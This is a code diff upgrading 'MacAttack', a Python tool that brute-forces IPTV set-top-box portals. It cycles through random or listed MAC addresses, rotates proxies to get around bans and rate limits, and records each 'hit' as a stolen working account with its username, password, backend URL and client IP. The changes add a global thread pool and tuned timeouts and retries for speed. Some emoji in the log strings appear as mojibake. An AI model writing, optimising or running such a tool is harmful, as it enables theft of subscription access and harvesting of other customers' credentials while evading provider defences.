@@ -23,8 +23,10 @@ import requests
 import waitress
 
 import stb
+import atexit
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-VERSION = "1.3.0"
+VERSION = "1.4.0"
 
 # Logging setup
 logger = logging.getLogger("MacAttack")
@@ -60,6 +62,33 @@ logger.info(f"Server will start on http://{host}")
 # Global state
 config = {}
 
+# 2. ADD GLOBAL EXECUTOR (after other globals)
+_global_executor = None
+_executor_lock = threading.Lock()
+
+def get_global_executor(max_workers=100):
+    """Get or create global ThreadPoolExecutor - NEVER shutdown during runtime."""
+    global _global_executor
+    if _global_executor is None:
+        with _executor_lock:
+            if _global_executor is None:
+                _global_executor = ThreadPoolExecutor(max_workers=max_workers)
+                logger.info(f"Global ThreadPoolExecutor created with {max_workers} workers")
+    return _global_executor
+
+def shutdown_global_executor():
+    """Only called on app exit via atexit."""
+    global _global_executor
+    if _global_executor:
+        logger.info("Shutting down global executor...")
+        _global_executor.shutdown(wait=False)
+        _global_executor = None
+
+# Register cleanup
+atexit.register(shutdown_global_executor)
+
+
+
 # Multi-portal attack states
 attack_states = {}  # portal_id -> attack_state
 attack_states_lock = threading.Lock()
@@ -90,6 +119,9 @@ defaultSettings = {
     "proxy_test_threads": 50,
     "unlimited_mac_retries": False,
     "max_mac_retries": 3,
+    "session_max_retries": 0,  # NEW: Control requests retries (0 = disable)
+    "session_connect_timeout": 5,  # NEW: Connect timeout
+    "session_read_timeout": 10,  # NEW: Read timeout
 }
 
 # Default proxy sources
@@ -659,7 +691,12 @@ def api_attack_clear():
 
 
 def run_attack(portal_id):
-    """Run the MAC attack for a specific portal - with retry logic like original MacAttack."""
+    """
+    Optimized MAC attack with:
+    - Global executor (no shutdown)
+    - Quick scan (early exit)
+    - Configurable retries & timeouts
+    """
     global proxy_error_counts
     
     with attack_states_lock:
@@ -678,284 +715,256 @@ def run_attack(portal_id):
     unlimited_mac_retries = settings.get("unlimited_mac_retries", False)
     max_mac_retries = settings.get("max_mac_retries", 3)
     
-    # Note: proxies are now loaded dynamically in the loop to support adding proxies during pause
+    # Use GLOBAL executor - NEVER call shutdown()!
+    executor = get_global_executor(max_workers=100)
+    
     proxy_index = 0
     
-    # Build MAC list based on mode
+    # Build MAC list
     if mode == "list":
         mac_list = config.get("mac_list", [])
     elif mode == "refresh":
-        # Get MACs from found_macs that match this portal
         found_macs = config.get("found_macs", [])
         portal_normalized = portal_url.rstrip('/').lower()
         mac_list = []
         for m in found_macs:
             mac_portal = (m.get("portal") or "").rstrip('/').lower()
-            # Match if portals are similar (handle slight URL differences)
             if mac_portal == portal_normalized or portal_normalized in mac_portal or mac_portal in portal_normalized:
                 mac_list.append(m.get("mac"))
-        mac_list = [m for m in mac_list if m]  # Remove empty
+        mac_list = [m for m in mac_list if m]
     else:
         mac_list = []
     
     mac_list_index = 0
-    
-    # Track retry counts per MAC (to avoid infinite loops)
     mac_retry_counts = defaultdict(int)
-    # Queue for MACs that need retry due to proxy errors
     retry_queue = []
     
-    # Log mode and MAC list info
-    add_log(state, f"Attack started with {speed} threads, mode: {mode}", "info")
-    if unlimited_mac_retries:
-        add_log(state, f"Unlimited MAC retries enabled - MACs will retry until proxy works", "info")
-    else:
-        add_log(state, f"Max {max_mac_retries} retries per MAC on proxy errors", "info")
+    add_log(state, f"Attack started: {speed} threads, mode: {mode}, timeout: {timeout}s", "info")
     
-    if mode == "list":
-        add_log(state, f"MAC list has {len(mac_list)} entries", "info")
+    if unlimited_mac_retries:
+        add_log(state, "Unlimited MAC retries enabled", "info")
+    else:
+        add_log(state, f"Max {max_mac_retries} retries per MAC", "info")
+    
+    if mode in ("list", "refresh"):
+        add_log(state, f"MAC list: {len(mac_list)} entries", "info")
         state["mac_list_total"] = len(mac_list)
         if len(mac_list) == 0:
             add_log(state, "WARNING: MAC list is empty!", "warning")
             state["running"] = False
             return
-    elif mode == "refresh":
-        add_log(state, f"Refreshing {len(mac_list)} found MACs for this portal", "info")
-        state["mac_list_total"] = len(mac_list)
-        if len(mac_list) == 0:
-            add_log(state, "WARNING: No found MACs for this portal!", "warning")
-            state["running"] = False
-            return
     else:
-        add_log(state, f"Using random MACs with prefix: {mac_prefix}", "info")
+        add_log(state, f"Random MACs with prefix: {mac_prefix}", "info")
     
     if use_proxies:
         initial_proxies = config.get("proxies", [])
         if initial_proxies:
-            add_log(state, f"Using {len(initial_proxies)} proxies with rotation", "info")
+            add_log(state, f"Using {len(initial_proxies)} proxies", "info")
         else:
-            add_log(state, "WARNING: Use Proxies enabled but no proxies loaded!", "warning")
+            add_log(state, "WARNING: Use Proxies enabled but no proxies!", "warning")
     
-    with ThreadPoolExecutor(max_workers=speed) as executor:
-        futures = {}
-        list_exhausted = False
+    futures = {}
+    list_exhausted = False
+    
+    while state["running"]:
+        # Pause handling
+        while state["paused"] and state["running"]:
+            time.sleep(0.5)
         
-        while state["running"]:
-            while state["paused"] and state["running"]:
-                time.sleep(0.5)
-            
-            if not state["running"]:
+        if not state["running"]:
+            break
+        
+        # Reload proxies dynamically
+        proxies = config.get("proxies", []) if use_proxies else []
+        
+        # Check if list exhausted
+        if mode in ("list", "refresh") and mac_list_index >= len(mac_list) and not retry_queue:
+            if not list_exhausted:
+                add_log(state, f"MAC list exhausted ({mac_list_index} submitted). Waiting...", "info")
+                list_exhausted = True
+            if not futures:
                 break
-            
-            # Reload proxies from config each iteration (allows adding proxies during pause)
-            proxies = config.get("proxies", []) if use_proxies else []
-            
-            # Check if we should stop adding new MACs (list or refresh mode)
-            if mode in ("list", "refresh") and mac_list_index >= len(mac_list) and not retry_queue:
-                if not list_exhausted:
-                    add_log(state, f"MAC list exhausted ({mac_list_index} submitted). Waiting for results...", "info")
-                    list_exhausted = True
-                # Don't break yet - wait for all futures to complete
-                if not futures:
-                    # All futures done
-                    break
-            
-            # Add new MACs to test (only if list not exhausted or random mode)
-            if not list_exhausted or retry_queue:
-                while len(futures) < speed and state["running"]:
-                    mac = None
-                    is_retry = False
-                    
-                    # First check retry queue (MACs that failed due to proxy errors)
-                    if retry_queue:
-                        mac = retry_queue.pop(0)
-                        is_retry = True
-                    elif mode in ("list", "refresh"):
-                        if mac_list_index >= len(mac_list):
-                            break
-                        mac = mac_list[mac_list_index]
-                        mac_list_index += 1
-                        state["mac_list_index"] = mac_list_index
-                    else:
-                        mac = generate_mac(mac_prefix)
-                    
-                    if not mac:
+        
+        # Submit new MACs
+        if not list_exhausted or retry_queue:
+            while len(futures) < speed and state["running"]:
+                mac = None
+                is_retry = False
+                
+                if retry_queue:
+                    mac = retry_queue.pop(0)
+                    is_retry = True
+                elif mode in ("list", "refresh"):
+                    if mac_list_index >= len(mac_list):
                         break
+                    mac = mac_list[mac_list_index]
+                    mac_list_index += 1
+                    state["mac_list_index"] = mac_list_index
+                else:
+                    mac = generate_mac(mac_prefix)
+                
+                if not mac:
+                    break
+                
+                proxy = None
+                if proxies:
+                    working_proxies = [p for p in proxies if proxy_error_counts[p] < max_proxy_errors]
+                    if not working_proxies:
+                        add_log(state, "âš  All proxies failed! Resetting...", "warning")
+                        proxy_error_counts.clear()
+                        working_proxies = proxies
+                    proxy = working_proxies[proxy_index % len(working_proxies)]
+                    proxy_index += 1
+                    state["current_proxy"] = proxy
+                
+                proxy_info = f" via {proxy}" if proxy else ""
+                retry_info = f" (retry {mac_retry_counts[mac]})" if is_retry else ""
+                add_log(state, f"Testing {mac}{proxy_info}{retry_info}", "info")
+                
+                # Submit to GLOBAL executor
+                future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout)
+                futures[future] = (mac, proxy)
+        
+        # Process completed futures
+        done_futures = [f for f in futures if f.done()]
+        
+        for future in done_futures:
+            mac, proxy = futures.pop(future)
+            try:
+                success, result = future.result()
+                state["tested"] += 1
+                state["current_mac"] = mac
+                
+                proxy_info = f" via {proxy}" if proxy else ""
+                
+                if success:
+                    state["hits"] += 1
                     
-                    proxy = None
-                    if proxies:
-                        working_proxies = [p for p in proxies if proxy_error_counts[p] < max_proxy_errors]
-                        if not working_proxies:
-                            add_log(state, f"⚠ All proxies failed! Resetting error counts and retrying...", "warning")
-                            proxy_error_counts.clear()
-                            working_proxies = proxies
-                        proxy = working_proxies[proxy_index % len(working_proxies)]
-                        proxy_index += 1
-                        state["current_proxy"] = proxy
+                    expiry = result.get("expiry", "Unknown")
+                    channels = result.get("channels", 0)
+                    genres = result.get("genres", [])
                     
-                    # Log that we're testing this MAC
-                    proxy_info = f" via {proxy}" if proxy else ""
-                    retry_info = f" (retry {mac_retry_counts[mac]})" if is_retry else ""
-                    add_log(state, f"Testing {mac}{proxy_info}{retry_info}", "info")
+                    de_channels = [g for g in genres if g.upper().startswith("DE") or "GERMAN" in g.upper() or "DEUTSCH" in g.upper()]
+                    has_de = len(de_channels) > 0
                     
-                    future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout)
-                    futures[future] = (mac, proxy)
+                    state["found_macs"].append({
+                        "mac": mac,
+                        "expiry": expiry,
+                        "channels": channels,
+                        "has_de": has_de,
+                        "time": datetime.now().strftime("%H:%M:%S")
+                    })
+                    
+                    de_info = " ðŸ‡©ðŸ‡ª" if has_de else ""
+                    add_log(state, f"ðŸŽ¯ HIT! {mac} - Expiry: {expiry} - Channels: {channels}{de_info}{proxy_info}", "success")
+                    
+                    # Save to config
+                    found_entry = {
+                        "mac": mac,
+                        "expiry": expiry,
+                        "portal": portal_url,
+                        "channels": channels,
+                        "genres": genres,
+                        "has_de": has_de,
+                        "de_genres": de_channels,
+                        "vod_categories": result.get("vod_categories", []),
+                        "series_categories": result.get("series_categories", []),
+                        "backend_url": result.get("backend_url"),
+                        "username": result.get("username"),
+                        "password": result.get("password"),
+                        "max_connections": result.get("max_connections"),
+                        "created_at": result.get("created_at"),
+                        "client_ip": result.get("client_ip"),
+                        "found_at": datetime.now().isoformat()
+                    }
+                    
+                    # Check duplicates
+                    existing_idx = None
+                    for idx, existing in enumerate(config["found_macs"]):
+                        if existing.get("mac") == mac and existing.get("portal") == portal_url:
+                            existing_idx = idx
+                            break
+                    
+                    if existing_idx is not None:
+                        config["found_macs"][existing_idx] = found_entry
+                    else:
+                        config["found_macs"].append(found_entry)
+                    
+                    if settings.get("auto_save", True):
+                        save_config()
+                    
+                    if mac in mac_retry_counts:
+                        del mac_retry_counts[mac]
+                else:
+                    add_log(state, f"âœ— {mac} - No valid account{proxy_info}", "info")
+                    if mac in mac_retry_counts:
+                        del mac_retry_counts[mac]
             
-            # Process completed futures
-            done_futures = [f for f in futures if f.done()]
-            
-            for future in done_futures:
-                mac, proxy = futures.pop(future)
-                try:
-                    success, result = future.result()
+            except Exception as e:
+                error_msg = str(e).lower()
+                proxy_info = f" via {proxy}" if proxy else ""
+                
+                # Detect proxy errors
+                is_proxy_error = any(x in error_msg for x in [
+                    "timeout", "connection", "proxy", "socks", "403", "forbidden",
+                    "refused", "unreachable", "reset", "closed", "ssl", "certificate",
+                    "503", "502", "504", "rate", "limit", "banned", "blocked"
+                ])
+                
+                if is_proxy_error and proxy:
+                    mark_proxy_error(proxy, is_connection_error=True)
+                    error_count = proxy_error_counts.get(proxy, 0)
+                    
+                    if error_count >= max_proxy_errors:
+                        add_log(state, f"ðŸš« Proxy disabled: {proxy}", "error")
+                    else:
+                        add_log(state, f"âš  Proxy error ({error_count}/{max_proxy_errors}): {proxy}", "warning")
+                    
+                    mac_retry_counts[mac] += 1
+                    working_proxies_left = [p for p in proxies if proxy_error_counts.get(p, 0) < max_proxy_errors]
+                    
+                    if unlimited_mac_retries:
+                        if working_proxies_left:
+                            retry_queue.append(mac)
+                            add_log(state, f"ðŸ”„ Retry {mac} (attempt {mac_retry_counts[mac]})", "info")
+                        else:
+                            state["tested"] += 1
+                            state["errors"] += 1
+                            add_log(state, f"âœ— {mac} - All proxies exhausted", "error")
+                            del mac_retry_counts[mac]
+                    else:
+                        if mac_retry_counts[mac] < max_mac_retries:
+                            retry_queue.append(mac)
+                            add_log(state, f"ðŸ”„ Retry {mac} ({mac_retry_counts[mac]}/{max_mac_retries})", "info")
+                        else:
+                            state["tested"] += 1
+                            state["errors"] += 1
+                            add_log(state, f"âœ— {mac} - Max retries reached", "error")
+                            del mac_retry_counts[mac]
+                else:
                     state["tested"] += 1
-                    state["current_mac"] = mac
-                    
-                    proxy_info = f" via {proxy}" if proxy else ""
-                    
-                    if success:
-                        state["hits"] += 1
-                        
-                        expiry = result.get("expiry", "Unknown")
-                        channels = result.get("channels", 0)
-                        genres = result.get("genres", [])
-                        
-                        # Check for DE channels in genres
-                        de_channels = [g for g in genres if g.upper().startswith("DE") or "GERMAN" in g.upper() or "DEUTSCH" in g.upper()]
-                        has_de = len(de_channels) > 0
-                        
-                        state["found_macs"].append({
-                            "mac": mac,
-                            "expiry": expiry,
-                            "channels": channels,
-                            "has_de": has_de,
-                            "time": datetime.now().strftime("%H:%M:%S")
-                        })
-                        
-                        de_info = " 🇩🇪" if has_de else ""
-                        add_log(state, f"🎯 HIT! {mac} - Expiry: {expiry} - Channels: {channels}{de_info}{proxy_info}", "success")
-                        
-                        # Save to persistent storage - check for duplicates (same MAC + Portal)
-                        found_entry = {
-                            "mac": mac,
-                            "expiry": expiry,
-                            "portal": portal_url,
-                            "channels": channels,
-                            "genres": genres,
-                            "has_de": has_de,
-                            "de_genres": de_channels,
-                            "vod_categories": result.get("vod_categories", []),
-                            "series_categories": result.get("series_categories", []),
-                            "backend_url": result.get("backend_url"),
-                            "username": result.get("username"),
-                            "password": result.get("password"),
-                            "max_connections": result.get("max_connections"),
-                            "created_at": result.get("created_at"),
-                            "client_ip": result.get("client_ip"),
-                            "found_at": datetime.now().isoformat()
-                        }
-                        
-                        # Check if MAC+Portal already exists - update instead of append
-                        existing_idx = None
-                        for idx, existing in enumerate(config["found_macs"]):
-                            if existing.get("mac") == mac and existing.get("portal") == portal_url:
-                                existing_idx = idx
-                                break
-                        
-                        if existing_idx is not None:
-                            # Update existing entry
-                            config["found_macs"][existing_idx] = found_entry
-                            logger.info(f"Updated existing MAC in config: {mac}")
-                        else:
-                            # Add new entry
-                            config["found_macs"].append(found_entry)
-                            logger.info(f"Saved new MAC to config: {mac}")
-                        
-                        if settings.get("auto_save", True):
-                            save_config()
-                        
-                        # Clear retry count on success
-                        if mac in mac_retry_counts:
-                            del mac_retry_counts[mac]
-                    else:
-                        add_log(state, f"✗ {mac} - No valid account{proxy_info}", "info")
-                        # Clear retry count - MAC was tested successfully (just no valid account)
-                        if mac in mac_retry_counts:
-                            del mac_retry_counts[mac]
-                    
-                except Exception as e:
-                    error_msg = str(e).lower()
-                    proxy_info = f" via {proxy}" if proxy else ""
-                    
-                    # Check if this is a proxy-related error (like original MacAttack)
-                    is_proxy_error = any(x in error_msg for x in [
-                        "timeout", "connection", "proxy", "socks", "403", "forbidden",
-                        "refused", "unreachable", "reset", "closed", "ssl", "certificate",
-                        "503", "502", "504", "rate", "limit", "banned", "blocked"
-                    ])
-                    
-                    if is_proxy_error and proxy:
-                        # Mark proxy error
-                        mark_proxy_error(proxy, is_connection_error=True)
-                        error_count = proxy_error_counts.get(proxy, 0)
-                        
-                        if error_count >= max_proxy_errors:
-                            add_log(state, f"🚫 Proxy disabled (too many errors): {proxy}", "error")
-                        else:
-                            add_log(state, f"⚠ Proxy error ({error_count}/{max_proxy_errors}): {proxy} - {str(e)[:40]}", "warning")
-                        
-                        # Retry MAC with different proxy
-                        mac_retry_counts[mac] += 1
-                        
-                        # Check if we have working proxies left
-                        working_proxies_left = [p for p in proxies if proxy_error_counts.get(p, 0) < max_proxy_errors]
-                        
-                        if unlimited_mac_retries:
-                            # Unlimited retries - keep retrying as long as there are working proxies
-                            if working_proxies_left:
-                                retry_queue.append(mac)
-                                add_log(state, f"🔄 Queuing {mac} for retry (attempt {mac_retry_counts[mac]}, {len(working_proxies_left)} proxies left)", "info")
-                            else:
-                                # No working proxies left - count as error
-                                state["tested"] += 1
-                                state["errors"] += 1
-                                add_log(state, f"✗ {mac} - All proxies exhausted, skipping", "error")
-                                del mac_retry_counts[mac]
-                        else:
-                            # Limited retries
-                            if mac_retry_counts[mac] < max_mac_retries:
-                                retry_queue.append(mac)
-                                add_log(state, f"🔄 Queuing {mac} for retry ({mac_retry_counts[mac]}/{max_mac_retries})", "info")
-                            else:
-                                # Max retries reached - count as error
-                                state["tested"] += 1
-                                state["errors"] += 1
-                                add_log(state, f"✗ {mac} - Max retries ({max_mac_retries}) reached, skipping", "error")
-                                del mac_retry_counts[mac]
-                    else:
-                        # Non-proxy error - count as tested
-                        state["tested"] += 1
-                        state["errors"] += 1
-                        add_log(state, f"✗ Error: {mac} - {str(e)[:50]}", "error")
-                        if mac in mac_retry_counts:
-                            del mac_retry_counts[mac]
-            
-            time.sleep(0.05)
+                    state["errors"] += 1
+                    add_log(state, f"âœ— Error: {mac} - {str(e)[:50]}", "error")
+                    if mac in mac_retry_counts:
+                        del mac_retry_counts[mac]
+        
+        time.sleep(0.05)
     
     state["running"] = False
     
-    # Show proxy error summary at end
     if proxies:
         failed_proxies = [p for p in proxies if proxy_error_counts.get(p, 0) >= max_proxy_errors]
         if failed_proxies:
-            add_log(state, f"⚠ {len(failed_proxies)} proxies disabled due to errors: {', '.join(failed_proxies[:3])}{'...' if len(failed_proxies) > 3 else ''}", "warning")
+            add_log(state, f"âš  {len(failed_proxies)} proxies disabled", "warning")
     
-    add_log(state, f"✓ Finished. Tested: {state['tested']}, Hits: {state['hits']}, Errors: {state['errors']}", "success")
+    add_log(state, f"âœ“ Finished. Tested: {state['tested']}, Hits: {state['hits']}, Errors: {state['errors']}", "success")
 
 
 def test_mac_worker(portal_url, mac, proxy, timeout):
-    """Use full MAC test like original MacAttack."""
-    return stb.test_mac_full(portal_url, mac, proxy, timeout)
+    """Worker using optimized stb.test_mac_full() with settings."""
+    settings = get_settings()
+    max_retries = settings.get("session_max_retries", 0)
+    return stb.test_mac_full(portal_url, mac, proxy, timeout, max_retries=max_retries)
 
 
 # ============== PROXY ROUTES WITH CUSTOM SOURCES ==============
